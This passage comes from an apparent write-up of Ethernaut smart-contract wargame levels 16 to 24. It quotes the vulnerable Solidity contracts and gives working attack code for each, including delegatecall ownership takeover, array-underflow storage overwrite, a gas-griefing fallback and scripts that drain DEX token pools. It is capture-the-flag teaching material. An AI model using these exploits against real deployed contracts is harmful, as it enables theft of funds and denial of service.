Then, we simply approve all our tokens to this address, and call `withdrawFrom` there with the respective parameters.

## 16. [Preservation](https://ethernaut.openzeppelin.com/level/16)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {
  // public library contracts
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner;
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress;
    timeZone2Library = _timeZone2LibraryAddress;
    owner = msg.sender;
  }

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {
  // stores a timestamp
  uint storedTime;

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

Here we are in the hands of the almighty `delegatecall`. The given contract actually suffers from a bug, which we used as an exploit in the 6th level (Delegation). When we call `setFirstTime`, it actually overwrites the value in `timeZone1Library` storage variable! Here is what we do:

1. Create a contract that has a function with `setTime(uint256)` signature. This contract should have enough storage variables so that you can overwrite `owner` variable in the caller's context.
2. Set the `timeZone1Library` address to the address of this contract via `setFirstTime(<your contract address>)`.
3. Call `setFirstTime(<whatever>)` again to execute your custom function.
4. Et voila! You are the owner.

A good takeaway from this level, quoting the author's message: "This example demonstrates why the library keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables."

## 17. [Recovery](https://ethernaut.openzeppelin.com/level/17)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Recovery {
  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
  }
}

contract SimpleToken {
  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public {
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}
```

My initial solution was to check the internal transactions of the contract creation transaction of my level instance. There, we can very well see the "lost" contract address, and we will call the `destroy` function there. To call a function with arguments, you need to provide a `calldata` (see [here](https://docs.soliditylang.org/en/latest/abi-spec.html#examples)). The arguments are given in chunks of 32-bytes, but the first 4 bytes of the `calldata` indicate the function to be called. That is calculated by the first 4 bytes of the function's canonical form. There are several ways to find it:

- Use a tool online.
- Write a bit of Solidity code and calculate `bytes4(keccak256("destory(address)"))`, which requires you to hand-write the canonical form.
- Write a small contract and run it locally (such as Remix IDE with VM) as follows:

```solidity
contract AAA {
  // this is the same function from ethernaut
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }

  // we can directly find its selector
  function print() public pure returns (bytes4) {
    return this.destroy.selector;
  }
}
```

With any of the methods above, we find the function selector to be `0x00f55d9d`. We can then call the `destroy` function as follows:

```js
const functionSelector = "0x00f55d9d";
await web3.eth.sendTransaction({
  from: player,
  to: "0x559905e90cF45D7495e63dA1baEFB54d63B1436A", // the lost & found address
  data: web3.utils.encodePacked(
    functionSelector,
    web3.utils.padLeft(player, 64),
  ),
});
```

### Original Solution

Upon sending my solution to Ethernaut, I have learned the actual solution in the message afterwards! Turns out that contract addresses are deterministic and are calculated by `keccack256(RLP_encode(address, nonce))`. The nonce for a contract is the number of contracts it has created. All nonce's are 0 for contracts, but they become 1 once they are created (their own creation makes the nonce 1).

Read about RLP encoding in the Ethereum docs [here](https://ethereum.org/en/developers/docs/data-structures-and-encoding/rlp). We want the RLP encoding of a 20 byte address and a nonce value of 1, which corresponds to the list such as `[<20 byte string>, <1 byte integer>]`.

For the string:

> if a string is 0-55 bytes long, the RLP encoding consists of a single byte with value 0x80 (dec. 128) plus the length of the string followed by the string. The range of the first byte is thus [0x80, 0xb7] (dec. [128, 183]).

For the list, with the string and the nonce in it:

> if the total payload of a list (i.e. the combined length of all its items being RLP encoded) is 0-55 bytes long, the RLP encoding consists of a single byte with value 0xc0 plus the length of the list followed by the concatenation of the RLP encodings of the items. The range of the first byte is thus [0xc0, 0xf7] (dec. [192, 247]).

This means that we will have:

```text
[
  0xC0
    + 1 (a byte for string length)
    + 20 (string length itself)
    + 1 (nonce),
  0x80
    + 20 (string length),
  <20 byte string>,
  <1 byte nonce>
]
```

In short: `[0xD6, 0x94, <address>, 0x01]`. We need to find the `keccak256` of the packed version of this array, which we can find via:

```js
web3.utils.soliditySha3(
  "0xd6",
  "0x94",
  // <instance address>,
  "0x01",
);
```

What is different with `soliditySha3` rather than `sha3` is that this one will encode-packed the parameters like Solidity would; hashing afterwards. The last 20 bytes of the resulting digest will be the contract address! Calling the `destroy` function is same as above.

## 18. [Magic Number](https://ethernaut.openzeppelin.com/level/18)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MagicNum {

  address public solver;

  constructor() public {}

  function setSolver(address _solver) public {
    solver = _solver;
  }

  /*
    ____________/\\\_______/\\\\\\\\\_____
     __________/\\\\\_____/\\\///////\\\___
      ________/\\\/\\\____\///______\//\\\__
       ______/\\\/\/\\\______________/\\\/___
        ____/\\\/__\/\\\___________/\\\//_____
         __/\\\\\\\\\\\\\\\\_____/\\\//________
          _\///////////\\\//____/\\\/___________
           ___________\/\\\_____/\\\\\\\\\\\\\\\_
            ___________\///_____\///////////////__
  */
}
```

In this level, we have to write a contract that returns 42 in as little as 10 opcodes. When I write the following contract:

```solidity
contract Solver {
  function whatIsTheMeaningOfLife() public pure returns (uint) {
    return 42;
  }
}
```

and deploy it, I see that there are _waaay_ more than 10 opcodes when I call the function and check the opcodes in the Remix IDE debugger. So, we need to somehow write our own assembly there. To do this, we will **become** the compiler and do barebones contract creation: a transaction to address `0x0` with some data that makes our contract! Contract creation codes are made of two parts: initialization code and runtime code. Let us do the runtime first, since we know what to do there: return 42 somehow!

### Runtime Code

I remembered the days I was taking an Assembly x8086 class back in my bachelor's, where we had to bring a bunch of papers stabled together, with all x8086 instructions on it! Our documentation here for opcodes will be <https://www.ethervm.io/>. You can also check <https://www.evm.codes/>.

1. I CTRL+F to search "return", and first check the [`RETURN`](https://www.ethervm.io/#F3) opcode: `RETURN <offset> <length>`. Apparently, it returns `length` bytes from the `offset` in memory. So we need to store our 42 in **memory** first.
2. I CTRL+F "memory" to find the [related section](https://www.ethervm.io/#memory), and there we have 3 instructions. I find [`MSTORE`](https://www.ethervm.io/#52) to be good for our use-case. `MSTORE <offset> <value>`. Now we need to provide the actual data that these instructions read from the **stack**. _Note: using `MSTORE8` did not work._
3. I CTRL+F "stack" to find the [related section](https://www.ethervm.io/#stack) and there we find [`PUSH1`](https://www.ethervm.io/#60) to be useful for us. How to provide argument to this guy? Here is the answer:

> Each opcode is encoded as one byte, except for the PUSH opcodes, which take a immediate value. All opcodes pop their operands from the top of the stack and push their result.

So here is the plan:

```c
PUSH1 0x2A // our 1 byte value 42 = 0x2A
PUSH1 0x80 // memory position 0x80, the first free slot
MSTORE     // stores 0x2A at 0x80
PUSH1 0x20 // to return an uint256, we need 32 bytes (not 1)
PUSH1 0x80 // position to return the data
RETURN     // returns 32 bytes from 0x80
```

The memory slot `0x80` is very important to note. I initially wrote to other smaller memory slots but my solution was not accepted; turns out that the first 4 32-byte slots are reserved! Read more at <https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_memory.html>.

In terms of bytecode, we need all of these written consecutively as one big chunk, with the actual opcodes instead of instructions. `PUSH1` is `60`, `MSTORE` is `52` and `RETURN` is `F3`. Writing everything side by side we get: `60 2A 60 80 52 60 20 60 80 F3`; our brand new runtime code; exactly 10 bytes!

### Initialization Code

So how exactly do we tell EVM to use that thing above as our runtime code? We need to write the initalization part too. In the [contract creation section](https://www.ethervm.io/#contract-creation) we see that:

> The data payload of a transaction creating a smart contract is itself bytecode that runs the contract constructor, sets up the initial contract state and returns the final contract bytecode.

Aha, we have to "return the final contract bytecode". So we need to somehow put our code in memory at some index, and `return` just like above. At this point:

1. I CTRL+F "contract" and stumble upon [`CODECOPY`](https://www.ethervm.io/#39) instruction, which seems to be just what we need: putting code in memory. `CODECOPY <destOffset> <offset> <length>` puts the code at `offset` with `length` bytes to memory at `destOffset`. The `offset` refers to the actual bytecode, so this will be the starting index of our runtime code above. However, we do not know that until we finish writing the initialization code, because runtime code comes **after** it.
2. The return part is same as above, `RETURN <offset> <length>` where `offset` is the index of our runtime code and `length` is the length of it, which we know to be 10 bytes.

Our initialization code is thus:

```c
PUSH1 0x0a // 10 bytes
PUSH1 ;;;; // position in bytecode, we dont know yet
PUSH1 0x00 // write to memory position 0
CODECOPY   // copies the bytecode
PUSH1 0x0a // 10 bytes
PUSH1 0x00 // read from memory position 0
RETURN     // returns the code copied above
```

Writing this in bytecode gives us `60 0a 60 ;; 60 00 39 60 0a 60 00 F3` which is 12 bytes. So that dummy `;;;;` has to be 12, i.e. `0x0C`.

### Deploying the Contract

In Ethereum, any transaction that is targeted at `0x0` is a contract creation transaction, so we will do a call like:

```js
await web3.eth.sendTransaction({
  from: player,
  to: 0, // contract creation
  data: "0x600a600C600039600a6000F3602a60805260206080F3", // bytecodes
});
```

The returned object in console will have a `contractAddress` if everything goes well. You can confirm that the bytecode is correct by checking it on <https://rinkeby.etherscan.io/>, and look at the opcodes by clicking "Switch To Opcodes View" button under the "Contract" tab. Afterwards, just set the solver to this contract address and submit!

## 19. [Alien Codex](https://ethernaut.openzeppelin.com/level/19)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }

  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
  	codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
}
```

The problem is hinting us to somehow use the `codex` array to change the owner of the contract. The tool in doing so probably has something to do with the `length` of array. In fact, the `retract` is suspiciously dangerous, and actually might _underflow_ the array length!. The array length is an `uint256`, and once it is underflowed you basically "have" the entire contract storage (all `2 ^ 256 - 1` slots) as a part of your array. Consequently, you can index everything in the memory with that array!

- After `make_contact`, we see that `await web3.eth.getStorageAt(contract.address, 0)` returns `0x000000000000000000000001da5b3fb76c78b6edee6be8f11a1c31ecfb02b272`. Remember that smaller than 32-bytes variables are bundled together if they are conseuctive, so this is actually `owner` and `contact` variable side by side! The `01` at the end of leftmost `0x00..01` stands for the boolean value.
- The next slot, `await web3.eth.getStorageAt(contract.address, 1)` is the length of `codex` array. If you record something you will see that it gets incremented. Well, what if we `retract`? You will be shocked to see that it becomes `0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff`!

So then, how does indexing work and how can we index the `owner` slot now that our array covers the entire storage? We look at the docs of highest version 0.5.0 as that is what the puzzle uses: <https://docs.soliditylang.org/en/v0.5.17/miscellaneous.html#mappings-and-dynamic-arrays>.

> The mapping or the dynamic array itself occupies a slot in storage at some position p according to the above rule (or by recursively applying this rule for mappings of mappings or arrays of arrays). For dynamic arrays, this slot stores the number of elements in the array. Array data is located at keccak256(p).

To see this in action, we can do:

```js
await contract.record("0xffffffffffffffffffffffffffffffff");
await web3.eth.getStorageAt(
  contract.address,
  web3.utils.hexToNumberString(web3.utils.soliditySha3(1)),
);
// 0xffffffffffffffffffffffffffffffff00000000000000000000000000000000
```

Alright, so first we have to `retract` until the array length underflows, and then we just have to offset enough from `keccak256(1)` until we overflow and get back to 0th index, overwriting the `owner`! The array data is located at `uint256(keccak256(1))` and there are `2 ** 256 - 1 - uint256(keccak256(1))` values between that and the end of memory. So, just adding one more to that would mean we go to 0th index. To calculate this index I just wrote a small Solidity code in Remix:

```solidity
function index() public pure returns(uint256) {
  return type(uint256).max - uint256(keccak256(abi.encodePacked(uint256(1)))) + 1;
}
```

Then I call the `revise` function as follows:

```js
await contract.codex(
  "35707666377435648211887908874984608119992236509074197713628505308453184860938",
); // if you want to confirm
await contract.revise(
  "35707666377435648211887908874984608119992236509074197713628505308453184860938",
  web3.utils.padLeft(player, 64),
);
```

Note that you can't set the array length property since version 0.6.0, thankfully! See <https://ethereum.stackexchange.com/a/84130>.

## 20. [Denial](https://ethernaut.openzeppelin.com/level/20)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Denial {
  using SafeMath for uint256;
  address public partner; // withdrawal partner - pay the gas, split the withdraw
  address payable public constant owner = address(0xA9E);
  uint timeLastWithdrawn;
  mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

  function setWithdrawPartner(address _partner) public {
    partner = _partner;
  }

  // withdraw 1% to recipient and 1% to owner
  function withdraw() public {
    uint amountToSend = address(this).balance.div(100);
    // perform a call without checking return
    // The recipient can revert, the owner will still get their share
    partner.call{value:amountToSend}("");
    owner.transfer(amountToSend);
    // keep track of last withdrawal time
    timeLastWithdrawn = now;
    withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
  }

  // allow deposit of funds
  receive() external payable {}

  // convenience function
  function contractBalance() public view returns (uint) {
    return address(this).balance;
  }
}
```

In this level, the exploit has to do with `call` function: `partner.call{value:amountToSend}("")`. Here, a `call` is made to the partner address, with empty `msg.data` and `amountToSend` value. When using `call`, if you do not specify the amount of gas to forward, it will forward everything! As the comment line says, reverting the call will not affect the execution, but what if we consume all gas in that call?

That is the attack. We will write a `fallback` function because the call is made with no message data, and we will just put an infinite loop in there:

```solidity
contract BadPartner {
  fallback() external payable {
    while (true) {}
  }
}
```

We then set the withdrawal partner as this contract address, and we are done. Note that `call` can use at most 63/64 of the remaining gas (see [EIP-150](https://github.com/ethereum/EIPs/blob/master/EIPS/eip-150.md)). If 1/64 of the gas is enough to finish the rest of the stuff, you are good. To be safe though, just specify the amount of gas to forward.

## 21. [Shop](https://ethernaut.openzeppelin.com/level/21)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

We had a similar puzzle back in the Elevator level: we need a function to return different things in a single transaction. The most barebones solution would be to check `gasLeft()` and return different results based on it, but here we have a cleaner solution.

```solidity
function buy() public {
  Buyer _buyer = Buyer(msg.sender);

  // during this call, isSold is false
  if (_buyer.price() >= price && !isSold) {
    // the state will change for isSold
    isSold = true;
    // during this call, isSold is true
    price = _buyer.price();
  }
}
```

As commented above, we can query the value of `isSold` and return a different result based on it. Our attacker contract will look like below, assuming we provide the Shop contract and the Buyer interface:

```solidity
contract BadBuyer is Buyer {
  Shop target;
  constructor(address _target) {
    target = Shop(_target);
  }

  function price() external view override returns (uint) {
    return target.isSold() ? 0 : 100;
  }

  function pwn() public {
    target.buy();
  }
}
```

## 22. [Dex One](https://ethernaut.openzeppelin.com/level/22)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract Dex is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) public ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

In this level, we have a Decentralized Exchange (DEX) contract. In my instance, these are the two tokens of the DEX:

- token 1: [0xc0C87488841BF66e402F431853b100A735c1db73](https://rinkeby.etherscan.io/address/0xc0C87488841BF66e402F431853b100A735c1db73)
- token 2: [0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb](https://rinkeby.etherscan.io/address/0x7EdAC717C9f67727c9c13B78AcC89B7f84dcEedb)

We can check that we have a bit of both tokens:

```js
// we have 10 of both tokens
(await contract.balanceOf(await contract.token1(), player))
  .toNumber()(await contract.balanceOf(await contract.token2(), player))
  .toNumber()(
    // DEX has 100 of both tokens
    await contract.balanceOf(await contract.token1(), contract.address),
  )
  .toNumber()(
    await contract.balanceOf(await contract.token2(), contract.address),
  )
  .toNumber();
```

We are asked to "drain all of at least 1 of the 2 tokens from the contract, and allow the contract to report a _bad_ price of the assets". Let us take a deeper look into the swap function then:

```solidity
function swap(address from, address to, uint amount) public {
  // token addresses must be valid
  require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");

  // sender must have enough balance of FROM
  require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");

  // calculate the price, we can inline the actual formula here
  // uint swapAmount = getSwapPrice(from, to, amount);
  uint swapAmount = (
    (amount * IERC20(to).balanceOf(address(this))) /
              IERC20(from).balanceOf(address(this))
    );

  // DEX takes "amount" tokens from us
  IERC20(from).transferFrom(msg.sender, address(this), amount);

  // DEX gives "swapAmount" tokens to us
  IERC20(to).approve(address(this), swapAmount);
  IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

There aren't any obvious attack vectors so far, so let us delve a bit more into the swapping formula. Let `d_t` and `p_t` denote the balance of DEX and Player for token `t` respectively, `a` denote amount, and `sa` denote swap amount. Note that all values are integers, rounded down if needed.

Since we have equal amount of both, without loss of generality, let us swap all of our token 1:

```js
sa = p_1 * (d_2 / d_1) = 10 * (100 / 100) = 10
```

Giving us `p_1 = 0`, `p_2 = 20`, `d_1 = 110`, `d_2 = 90`, that is, we traded 10 of one token to 10 of the other. Now let us do the opposite with the new balances:

```js
sa = p_2 * (d_1 / d_2) = 20 * (110 / 90) = 24
```

Woah! We just got 24 tokens for giving 20, even though they were treated equally in the previous trade. Let us try to simulate this with javascript real quick and see if this goes on:

```js
function simulate(t1_dex, t2_dex, t1_player, t2_player, maxiters = 10) {
  // price function
  const price = (to_dex, from_dex, amount) =>
    Math.floor((amount * to_dex) / from_dex);
  let a, sa;

  console.log(`
  Initial
    D1: ${t1_dex}
    D2: ${t2_dex}
    P1: ${t1_player}
    P2: ${t2_player}`);
  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) {
    if (i % 2) {
      // trade 'a' amount of t1 for 'sa' amount of t2
      a = t1_player;
      sa = price(t2_dex, t1_dex, a);
      if (sa > t2_dex) {
        // DEX can't have negative, re-calculate
        // sa equals t2_dex this way:
        sa = price(t2_dex, t1_dex, t1_dex);
      }

      // from (t1) changes for a amounts
      t1_player -= a;
      t1_dex += a;

      // to (t2) changes for sa amounts
      t2_player += sa;
      t2_dex -= sa;
    } else {
      // trade 'a' amount of t2 for 'sa' amount of t1
      a = t2_player;
      sa = price(t1_dex, t2_dex, a);
      if (sa > t1_dex) {
        // DEX can't have negative, re-calculate
        // sa equals t1_dex this way:
        sa = price(t1_dex, t2_dex, t2_dex);
      }

      // from (t2) changes for a amounts
      t2_player -= a;
      t2_dex += a;

      // to (t1) changes for sa amounts
      t1_player += sa;
      t1_dex -= sa;
    }

    console.log(
      `Trade #${i}
        D1: ${t1_dex}
        D2: ${t2_dex}
        P1: ${t1_player}
        P2: ${t2_player}
        Gave: ${a} Token ${i % 2 ? "1" : "2"}
        Took: ${sa} Token ${i % 2 ? "2" : "1"}`,
    );
  }
}
// simulate(100, 100, 10, 10);
```

In the simulation, if you do not check whether the swap amount is greater than the balance of DEX, you would try to take more money than DEX has; consequently reverting the transaction. For this reason, when we go to negative values with the initially calculated swap amount, we re-calculate so that the swap amount is exactly the balance of DEX.

In the formula:

```js
a_s = p_from * (d_to / d_from) = d_to
```

means that `p_from` should be equal to `d_from`.

We can solve the puzzle by simply implementing the simulation above so that it actually calls the contract.

```js
async function pwn(maxiters = 10) {
  // initial settings
  const T1 = await contract.token1();
  const T2 = await contract.token2();
  const DEX = contract.address;
  const PLAYER = player;
  let a, sa;
  let [t1_player, t2_player, t1_dex, t2_dex] = (
    await Promise.all([
      contract.balanceOf(T1, PLAYER),
      contract.balanceOf(T2, PLAYER),
      contract.balanceOf(T1, DEX),
      contract.balanceOf(T2, DEX),
    ])
  ).map((bn) => bn.toNumber());

  console.log(`
  Initial
    D1: ${t1_dex}
    D2: ${t2_dex}
    P1: ${t1_player}
    P2: ${t2_player}`);

  for (i = 1; i != maxiters && t1_dex > 0 && t2_dex > 0; ++i) {
    if (i % 2) {
      // trade t1 to t2
      a = t1_player;
      sa = (await contract.getSwapPrice(T1, T2, a)).toNumber();
      if (sa > t2_dex) {
        a = t1_dex;
      }

      // make the call
      await contract.approve(contract.address, a);
      await contract.swap(T1, T2, a);
    } else {
      // trade t2 to t1
      a = t2_player;
      sa = (await contract.getSwapPrice(T2, T1, a)).toNumber();
      if (sa > t1_dex) {
        a = t2_dex;
      }

      // make the call
      await contract.approve(contract.address, a);
      await contract.swap(T2, T1, a);
    }

    // new balances
    [t1_player, t2_player, t1_dex, t2_dex] = (
      await Promise.all([
        contract.balanceOf(T1, PLAYER),
        contract.balanceOf(T2, PLAYER),
        contract.balanceOf(T1, DEX),
        contract.balanceOf(T2, DEX),
      ])
    ).map((bn) => bn.toNumber());

    console.log(
      `Trade #${i}
        D1: ${t1_dex}
        D2: ${t2_dex}
        P1: ${t1_player}
        P2: ${t2_player}
        Gave: ${a} Token ${i % 2 ? "1" : "2"}
        Took: ${sa} Token ${i % 2 ? "2" : "1"}`,
    );
  }
}
// await pwn()
```

Once you run the function above, it will take a series of transactions (your console will be quite colorful) to complete but in the end, DEX will have depleted one of the tokens! To confirm, you may run the 4 lines at the beginning of this post to check the balances.

## 23. [Dex Two](https://ethernaut.openzeppelin.com/level/23)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';
import '@openzeppelin/contracts/access/Ownable.sol';

contract DexTwo is Ownable {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor() public {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
    _mint(msg.sender, initialSupply);
    _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public returns(bool){
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
```

Here we have another DEX similar to the previous level, but this one requires both tokens to be depleted. There is one subtle yet crucial difference within the `swap` function, it does not check the validity of token addresses! In the previous one, we had a `require` statement checking that both `from` and `to` tokens are that of either tokens the DEX is responsible of. This gives us an idea of an attack, creating our own tokens and somehow use them to drain the DEX of its tokens.

Again, we have 10 of each token and the DEX has 100 of each. We will create Token 3 and Token 4, and let DEX have 100 of each. We will then make the following trades:

- Send 100 Token 3 to get 100 Token 1. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.
- Send 100 Token 4 to get 100 Token 2. Since the DEX balance of both `to` and `from` tokens are the same, the swap amount will be equal to the amount we set.

This way, the tokens will be depleted by our worthless and arbitrarily created tokens! We use Remix to create [Token 3](https://rinkeby.etherscan.io/address/0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B) and [Token 4](https://rinkeby.etherscan.io/address/0xc975954d79412d58746240c536220192485AECBB):

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";

contract MyToken3 is ERC20 {
  constructor() ERC20("MyToken3", "MT3") {
    _mint(msg.sender, 1000);
  }
}
contract MyToken4 is ERC20 {
  constructor() ERC20("MyToken4", "MT4") {
    _mint(msg.sender, 1000);
  }
}
```

After deploying the tokens, transfer 100 of each token to the DEX address, and also give an allowance of 100 of both tokens to the DEX. The actual trades are then simply as follows:

```js
// settings
const amount = 100;
const T1 = await contract.token1();
const T2 = await contract.token2();
const T3 = "0xF25aEe0A68c3EC602F0bDD9E45F062dF611F774B"; // my Token 3
const T4 = "0xc975954d79412d58746240c536220192485AECBB"; // my Token 4

// deplete Token 1
// DEX must have 'amount' T3, and also 'amount' allowance to take T3 from you
await contract.swap(T3, T1, amount);
// deplete Token 2
// DEX must have 'amount' T4, and also 'amount' allowance to take T4 from you
await contract.swap(T4, T2, amount);
```

To confirm the depletion, check the balances:

```js
(await contract.balanceOf(await contract.token1(), contract.address))
  .toNumber()(
    await contract.balanceOf(await contract.token2(), contract.address),
  )
  .toNumber();
```

## 24. [Puzzle Wallet](https://ethernaut.openzeppelin.com/level/24)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "@openzeppelin/contracts/math/SafeMath.sol";
import "@openzeppelin/contracts/proxy/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
  address public pendingAdmin;
  address public admin;

  constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public {
    admin = _admin;
  }

  modifier onlyAdmin {
    require(msg.sender == admin, "Caller is not the admin");
    _;
  }

  function proposeNewAdmin(address _newAdmin) external {
    pendingAdmin = _newAdmin;
  }

  function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
    require(pendingAdmin == _expectedAdmin, "Expected new admin by the current admin is not the pending admin");
    admin = pendingAdmin;
  }

  function upgradeTo(address _newImplementation) external onlyAdmin {
    _upgradeTo(_newImplementation);
  }
}

contract PuzzleWallet {
  using SafeMath for uint256;
  address public owner;
  uint256 public maxBalance;
  mapping(address => bool) public whitelisted;
  mapping(address => uint256) public balances;

  function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
  }

  modifier onlyWhitelisted {
    require(whitelisted[msg.sender], "Not whitelisted");
    _;
  }

  function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
  }

  function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
  }

  function deposit() external payable onlyWhitelisted {
    require(address(this).balance <= maxBalance, "Max balance reached");
    balances[msg.sender] = balances[msg.sender].add(msg.value);
  }

  function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] = balances[msg.sender].sub(value);
    (bool success, ) = to.call{ value: value }(data);
    require(success, "Execution failed");
  }

  function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
      bytes memory _data = data[i];
      bytes4 selector;
      assembly {
        selector := mload(add(_data, 32))
      }
      if (selector == this.deposit.selector) {
        require(!depositCalled, "Deposit can only be called once");
        // Protect against reusing msg.value
        depositCalled = true;
      }
      (bool success, ) = address(this).delegatecall(data[i]);
      require(success, "Error while delegating call");
